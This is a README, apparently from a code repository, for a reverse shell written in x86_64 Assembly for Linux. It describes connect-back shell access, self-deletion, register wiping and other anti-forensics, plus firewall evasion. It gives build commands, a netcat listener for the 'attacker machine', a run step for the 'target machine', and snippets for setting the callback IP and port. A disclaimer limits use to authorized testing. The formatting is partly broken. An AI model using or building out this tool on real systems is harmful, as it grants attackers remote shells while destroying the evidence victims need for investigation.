# reverse_shell_on_asm
# Reverse Shell in x86_64 Assembly

A lightweight reverse shell written entirely in x86_64 Assembly for Linux systems. Created for educational purposes and authorized penetration testing.

## 🚀 Features

- **Pure x86_64 Assembly** - No external dependencies
- **TCP Reverse Shell** - Connects back to attacker machine
- **Stream Redirection** - stdin, stdout, stderr redirected to socket
- **Self-Destruct Mechanism** - Automatically removes itself on disconnect
- **Anti-Forensics** - Register wiping and trace cleaning
- **Small Footprint** - Optimized for minimal size
- **Firewall Evasion Ready** - Easy to modify for IP/port rotation

## 📁 Project Structure


text

## 🔧 Building

### Prerequisites
- NASM (Netwide Assembler)
- Linux x86_64 system

### Compilation
```bash
make
Or manually:

bash
nasm -f elf64 my_reverse_shell.asm
ld -o reverse_shell my_reverse_shell.o
🎯 Usage
Start listener on attacker machine:

bash
nc -lvnp 4444
Execute shell on target machine:

bash
./my_reverse_shell
Interactive shell will be available in your netcat session.



⚙️ Configuration
Modify IP and Port
Edit my_reverse_shell.asm:

asm
; Change IP (network byte order)
dd 0x7F000001    ; 127.0.0.1 -> replace with target IP

; Change port (network byte order)  
dw 0x5C11        ; 4444 -> replace with target port
Network Byte Order Examples
IP 192.168.1.1 = 0x0101A8C0

Port 1337 = 0x3905



🛡️ Technical Details
System Calls Used
sys_socket (41) - Create socket

sys_connect (42) - Connect to remote host

sys_dup2 (33) - Redirect file descriptors

sys_execve (59) - Execute /bin/bash

sys_unlink (87) - Self-destruct

sys_exit (60) - Clean exit

Anti-Forensics Features
Complete register wiping before exit

Automatic file deletion on disconnect

No environment variables passed to execve

Minimal system trace left behind



⚠️ Disclaimer
FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY

Use only on systems you own or have explicit permission to test

The author is not responsible for any misuse of this code

Ensure compliance with local laws and regulations

Intended for security research and education



🎓 Educational Value
This project demonstrates:

Low-level system programming in Assembly

Linux system call interface

Network programming fundamentals

Process manipulation and stream redirection

Anti-forensics techniques

Shellcode development principles

🤝 Contributing
Contributions are welcome! Feel free to:

Report bugs and issues

Suggest new features

Submit pull requests with improvements

Share your modifications and optimizations

📜 License
This project is open source. Use responsibly and ethically.

